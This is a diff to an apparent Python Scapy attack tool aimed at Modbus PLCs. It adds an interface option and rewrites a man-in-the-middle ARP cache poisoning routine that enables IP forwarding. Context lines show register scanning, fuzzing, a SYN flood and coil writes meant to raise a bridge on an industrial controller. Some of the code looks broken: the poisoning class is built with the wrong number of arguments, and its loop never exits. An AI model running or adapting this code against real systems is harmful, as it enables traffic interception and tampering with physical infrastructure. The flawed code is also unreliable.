@@ -1,15 +1,14 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-# import logging
-# logging.getLogger("scapy").setLevel(1)
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 import sys
 import argparse
 import time
 import threading
 
-sys.path.append('/home/user/projects/tools/scapy')
 from scapy.all import *
 
 from modbus import *
@@ -21,18 +20,18 @@ from netaddr import *
 #    sys.exit(0)
 
 modport = 502
-iface = "eth1"
+iface = ""
 verbose = False
 transId = 1
-MINOBJECTID = 1
-MAXOBJECTID = 256
+#Device Identification Object range
+MINOBJECTID = 1 # Start at 1
+MAXOBJECTID = 256 # Ends at 256
 # Function codes range
 MINCODE = 1  # 0 is illegal
 MAXCODE = 45  # Upper than 127 are exception codes
-# Address range
+# Registers Address range
 MINADDR = 0
 MAXADDR = 256  # Default : 256
-
 
 class MBregisters():
 	"""
@@ -65,13 +64,13 @@ class MBregisters():
 	Read Device diagnostic
 	"""
 	def scanDeviceIdent(self):
-		global MINOBJECTID, MAXOBJECTID
+		global MINOBJECTID, MAXOBJECTID, iface
 		# Open connection
 		c = connectMb(self.ip)
 		
 		for objId in range(MINOBJECTID, MAXOBJECTID):
 			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU2B_Read_Device_Identification_Request(readCode=4, objectId=objId)
-			ans = c.sr1(pkt, verbose=verbose)
+			ans = c.sr1(pkt, verbose=verbose, iface=iface)
 			ans = ModbusADU_Response(str(ans))
 	
 			if ans.funcCode == 0x2B:
@@ -85,7 +84,7 @@ class MBregisters():
 	Test the device function codes defined
 	"""			
 	def checkCodeDefined(self, code):
-		global verbose
+		global verbose, iface
 ##		knownFunctions = [1, 2, 3, 4, 5, 6, 7, 15, 16, 17, 20, 21, 22, 23, 24, 43]	
 		
 		#Check if code has been already set
@@ -135,7 +134,7 @@ class MBregisters():
 		try:			
 			if verbose:
 				print pkt.summary()
-			ans = c.sr1(pkt, timeout=1000, verbose=False)
+			ans = c.sr1(pkt, timeout=1000, verbose=False, iface=iface)
 			ansADU = ModbusADU_Response(str(ans))
 			if verbose:
 				print ansADU.summary()
@@ -166,7 +165,7 @@ class MBregisters():
 
 
 	def checkCoilsDefined(self):
-		global verbose, MINADDR, MAXADDR
+		global verbose, MINADDR, MAXADDR, iface
 		self.checkCodeDefined(1)
 		if 1 not in self.code:
 			if verbose:
@@ -177,7 +176,7 @@ class MBregisters():
 		for addr in range(MINADDR, MAXADDR):
 			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU01_Read_Coils_Request(startAddr=addr, quantity=1)
 			
-			ans = c.sr1(pkt, verbose=verbose)
+			ans = c.sr1(pkt, verbose=verbose, iface=iface)
 			ansADU = ModbusADU_Response(str(ans))
 			if pkt.funcCode == ansADU.funcCode:
 				if verbose:
@@ -193,7 +192,7 @@ class MBregisters():
 
 
 	def checkInDiscreteDefined(self):
-		global verbose, MINADDR, MAXADDR
+		global verbose, MINADDR, MAXADDR, iface
 		self.checkCodeDefined(2)
 		if 2 not in self.code:
 			if verbose:
@@ -204,7 +203,7 @@ class MBregisters():
 		for addr in range(MINADDR, MAXADDR):
 			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU02_Read_Discrete_Inputs_Request(startAddr=addr, quantity=1)
 			
-			ans = c.sr1(pkt, verbose=verbose)
+			ans = c.sr1(pkt, verbose=verbose, iface=iface)
 			ansADU = ModbusADU_Response(str(ans))
 			if pkt.funcCode == ansADU.funcCode:
 				if verbose:
@@ -218,7 +217,7 @@ class MBregisters():
 		c.close()
 
 	def checkHoldRegDefined(self):
-		global verbose, MINADDR, MAXADDR
+		global verbose, MINADDR, MAXADDR, iface
 		self.checkCodeDefined(3)
 		if 3 not in self.code:
 			if verbose:
@@ -229,7 +228,7 @@ class MBregisters():
 		for addr in range(MINADDR, MAXADDR):
 			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU03_Read_Holding_Registers_Request(startAddr=addr, quantity=1)
 			
-			ans = c.sr1(pkt, verbose=verbose)
+			ans = c.sr1(pkt, verbose=verbose, iface=iface)
 			ansADU = ModbusADU_Response(str(ans))
 			if pkt.funcCode == ansADU.funcCode:
 				if verbose:
@@ -243,7 +242,7 @@ class MBregisters():
 		c.close()
 
 	def checkRegInDefined(self):
-		global verbose, MINADDR, MAXADDR
+		global verbose, MINADDR, MAXADDR, iface
 		self.checkCodeDefined(4)
 		if 4 not in self.code:
 			if verbose:
@@ -254,7 +253,7 @@ class MBregisters():
 		for addr in range(MINADDR, MAXADDR):
 			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU04_Read_Input_Registers_Request(startAddr=addr, quantity=1)
 			
-			ans = c.sr1(pkt, verbose=verbose)
+			ans = c.sr1(pkt, verbose=verbose, iface=iface)
 			ansADU = ModbusADU_Response(str(ans))
 			if pkt.funcCode == ansADU.funcCode:
 				if verbose:
@@ -414,19 +413,19 @@ Example of writing in coils
    Here, we make lift the bride
 """
 def injectValue(ip):
-
+	global iface
 	# Open connection
 	c = connectMb(ip)
 	
 	# Get the bridge to raise
 	myPayload = ModbusADU_Request(transId=getTransId()) / ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0000, outputValue=0xFF00)
-	c.sr1(myPayload)
+	c.sr1(myPayload, iface=iface)
 	
 	myPayload = ModbusADU_Request(transId=getTransId()) / ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0001, outputValue=0xFF00)
-	c.sr1(myPayload)
+	c.sr1(myPayload, iface=iface)
 
 	myPayload = ModbusADU_Request(transId=getTransId()) / ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0002, outputValue=0xFF00)
-	c.sr1(myPayload)
+	c.sr1(myPayload, iface=iface)
 
 	# close connection
 	c.close()
@@ -450,7 +449,7 @@ def SYN_flood(ip, timeout):
 Test malformated packet
 """
 def MBfuzzing(ip, test, quantity=50):
-	global verbose	
+	global verbose, iface
 		
 	# Fuzzing test for reading
 	for i in range (1, quantity):
@@ -481,7 +480,7 @@ def MBfuzzing(ip, test, quantity=50):
 		
 		print str(i) + " - " + pkt.summary()	
 		
-		ans = c.sr1(pkt, verbose=verbose)
+		ans = c.sr1(pkt, verbose=verbose, iface=iface)
 		if ans is not None:
 			ans = ModbusADU_Response(str(ans))
 			print ans.summary()
@@ -492,13 +491,14 @@ def MBfuzzing(ip, test, quantity=50):
 Test of reassembling Device identification packets
 """
 def fragIdentif(ip):
+	global iface
 	# Open connection
 	c = connectMb(ip)
 	more = 255
 	objectId = 0
 	while more == 255:
 		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU2B_Read_Device_Identification_Request(readCode=3, objectId=objectId)
-		ans = c.sr1(pkt, verbose=verbose)
+		ans = c.sr1(pkt, verbose=verbose, iface=iface)
 		ans = ModbusADU_Response(str(ans))
 
 		if ans.funcCode == 0x2B:
@@ -515,6 +515,7 @@ def fragIdentif(ip):
 Retreive a specific value of a register
 """
 def getValue(c, code, addr):
+	global iface
 	
 	if code == 1:
 		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU01_Read_Coils_Request(startAddr=addr)		
@@ -527,7 +528,7 @@ def getValue(c, code, addr):
 	else:
 		return None
 	
-	ans = c.sr1(pkt, verbose=verbose)
+	ans = c.sr1(pkt, verbose=verbose, iface=iface)
 	ans = ModbusADU_Response(str(ans))
 	
 	if ans.funcCode == 1:
@@ -598,52 +599,78 @@ def passiveMonitoring(ip, timeout):
 Define tool for an ARP Cache poisonning
 """
 class ARPCachePoisonning(threading.Thread):
-	def __init__(self, clientMAC, clientIP, gatewayIP):
+	def __init__(self, clientMAC, clientIP, gatewayMAC, gatewayIP):
 		threading.Thread.__init__(self)
 		self.clientMAC = clientMAC
 		self.clientIP = clientIP
+		self.gatewayMAC = gatewayMAC
 		self.gatewayIP = gatewayIP
 	def run(self):
 		self.sniffARP()
+		
 	"""
 	Send a gratuitous spoofed ARP
 	"""
-	def sendARP(self):
-#FIXME: not working
-		send( Ether(dst=self.clientMAC)/ARP(op=2, psrc=self.gatewayIP, pdst=self.clientIP), inter=RandNum(10,40), loop=1 )
-		
-	def sniffARP(self):
-		sniff(prn=self.replyARP, filter="arp", timeout=60)
-		
-#FIXME: not working
-	def replyARP(self, pkt):
-		if pkt[ARP].op != 1:
-			print "OP Code : " + str(pkt[ARP].op)
-			return
-		if pkt[Ether].src != self.clientMAC:
-			print str(pkt[Ether].src) + "<>" + str(self.clientMAC)
-			return
-		
-		print pkt.show()
-		
-		send( Ether(dst=self.clientMAC)/ARP(op=2, psrc=self.gatewayIP, pdst=self.clientIP), inter=RandNum(10,40), loop=1 )
+	def poisonARP(self):
+		send(ARP(op=2, pdst=self.clientIP, psrc=self.gatewayIP, hwdst=self.clientMAC))
+		send(ARP(op=2, pdst=self.gatewayIP, psrc=self.clientIP, hwdst=self.gatewayMAC))
+	def restoreARP(self):
+		send(ARP(op=2, pdst=self.gatewayIP, psrc=self.clientIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.clientMAC), count=3)
+		send(ARP(op=2, pdst=self.clientIP, psrc=self.gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewayMAC), count=3)
 
-
-
+#	def sniffARP(self):
+#		sniff(prn=self.replyARP, filter="arp", timeout=60, iface=iface)
+	def enableForwarding(self):
+		with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
+			ipf.write('1\n')
+	def disableForwarding(self):
+		with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
+			ipf.write('0\n')
+#	def replyARP(self, pkt):
+# 		global iface
+# 		if pkt[ARP].op != 1:
+# 			print "OP Code : " + str(pkt[ARP].op)
+# 			return
+# 		if pkt[Ether].src != self.clientMAC:
+# 			print str(pkt[Ether].src) + "<>" + str(self.clientMAC)
+# 			return
+# 		
+# 		print pkt.show()
+# 		
+# 		send( Ether(dst=self.clientMAC)/ARP(op=2, psrc=self.gatewayIP, pdst=self.clientIP), inter=RandNum(10,40), loop=1, iface=iface )
+	def poison(self):
+		self.enableForwarding();
+		self.running = True
+		while self.running is True:
+			self.poisonARP();
+		
+		self.restoreARP();
+		self.disableForwarding();
+	def ends(self):
+		self.running = False
+		
 """
 Launch an ARP poisonning attack
 """
 def launchARPpoisonning(clientIP, gatewayIP):
+	global verbose, iface
+	
 	clientMAC = getmacbyip(clientIP)
-	if clientMAC is None:
+	gatewayMAC = getmacbyip(gatewayIP)
+	if clientMAC is None or gatewayMAC is None:
+		if verbose:
+			print "Cannot get MAC addr"
 		return None
 	
-	
 	t = ARPCachePoisonning(clientMAC, clientIP, gatewayIP)
-	t.sendARP()
-	t.sniffARP()
-	t.join()
-	
+	t.poison()
+	sniff(prn=viewPkt, filter="icmp", timeout=60, iface=iface)
+
+	t.ends()
+
+
+def viewPkt(pkt):
+	print pkt.summary()
 
 """
 What to do if the script is call by  CLI and not imported
@@ -664,7 +691,7 @@ if __name__ == "__main__":
 	parser.add_argument("-x", "--timeout", help="Timeout in ms of connection", default=100)	
 	parser.add_argument("-v", "--verbose", help="increase output verbosity", action="store_true")
 	parser.add_argument("-c", "--intrusive", help="Make modification on PLC (use of Write functions)", action="store_true")
-	parser.add_argument("-i", "--interface", help="Network interface (eth0, etc.)")
+	parser.add_argument("-i", "--interface", help="Network interface (eth0, etc.)", default="eth0")
 	
 	args = parser.parse_args()
 
